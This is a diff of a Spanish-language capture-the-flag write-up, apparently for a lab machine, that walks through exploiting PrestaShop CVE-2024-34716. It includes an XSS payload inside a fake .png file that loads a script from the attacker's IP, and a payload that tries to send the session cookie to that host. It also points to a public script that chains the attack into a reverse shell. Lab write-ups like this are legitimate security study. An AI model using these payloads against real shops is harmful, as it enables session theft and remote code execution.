@@ -25,15 +25,18 @@ Encontramos el siguiente directorio de panel de login de Prestashop `http://shop
 Encontramos la versión y encontramos que tiene un CVE `CVE-2024-34716`
 `https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/`
 
-En el PoC nos explica que podemos crear un falso archivo `.png` en el cual podemos incluir contenido javascript que sera interpretado, por lo que se aconteceria un XXS
+En el PoC nos explica que podemos crear un falso archivo `.png` en el cual podemos incluir contenido JavaScript que será interpretado, por lo que se acontecería un XXS
 Este archivo se puede incluir en la web `http://shop.trickster.htb/contact-us`
 
 Creamos el fichero `test.png` con el contenido `<script src="http://10.10.14.18/malicius.js"></script>`
 
-El servicio web hace la solicitud al recurso que hemos levantado en el server de python
+El servicio web hace la solicitud al recurso que hemos levantado en el server de Python
 
 Podemos probar a listar la cookie de sesión `<script src="http://10.10.14.18/?cookie=" + document.cookie></script>`
 
-Como el HttpOnly esta en True no nos permine obtener la coockie
+Como el HttpOnly esta en True no nos permite obtener la cookie
 
-EN el PoC
+EN el PoC nos dice que hay que subir un tema malicioso podemos usar el repositorio `https://github.com/aelmokhtar/CVE-2024-34716` que nos lo automatiza
+
+Este script nos automatiza todo el proceso de ejecución devolviéndonos una Reverse Shell directamente
+
